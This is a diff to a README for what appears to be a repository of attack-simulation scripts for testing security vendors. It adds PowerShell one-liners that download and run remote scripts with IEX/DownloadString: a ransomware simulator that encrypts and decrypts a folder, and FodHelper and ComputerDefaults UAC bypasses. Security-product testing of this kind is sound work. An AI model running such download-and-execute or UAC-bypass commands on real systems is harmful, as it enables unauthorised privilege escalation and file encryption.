@@ -14,15 +14,17 @@ The scripts can be executed on production envirenmnet.
 ## Ransomware techniques:
 
 ### Encryption - 
-
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-RansomSIM.ps1"); Invoke-RansomSIM -Mode Encrypt -Path 'C:\Users\tester\Documents\Test';`
 
 ### Decryption - 
-
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-RansomSIM.ps1"); Invoke-RansomSIM -Mode Decrypt -Path 'C:\Users\tester\Documents\Test';`
 
 ## User Account Control Bypass (UAC) 
 
+### FodHelper
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-UAC1.ps1"); Invoke-FodHelper;`
+
+### ComputerDefaults
+`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-UAC2.ps1"); Invoke-ComputerDefaults;`
 
 ## Antimalware Scan Interface (AMSI) 
